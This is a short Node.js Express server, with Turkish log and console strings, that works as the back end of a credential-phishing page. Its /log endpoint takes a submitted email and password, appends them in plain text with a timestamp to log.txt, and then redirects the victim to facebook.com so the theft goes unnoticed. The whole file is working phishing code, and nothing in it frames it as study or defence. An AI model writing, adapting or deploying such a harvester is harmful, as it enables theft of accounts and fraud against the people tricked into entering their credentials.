const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));

app.post("/log", (req, res) => {
  const { email, password } = req.body;
  const log = `Email: ${email}, Şifre: ${password}, Tarih: ${new Date().toLocaleString()}\n`;
fs.appendFileSync("log.txt", log);
  res.redirect("https://facebook.com"); 
});

app.listen(3000, () => {
  console.log("Sunucu 3000 portunda çalışıyor.");
});
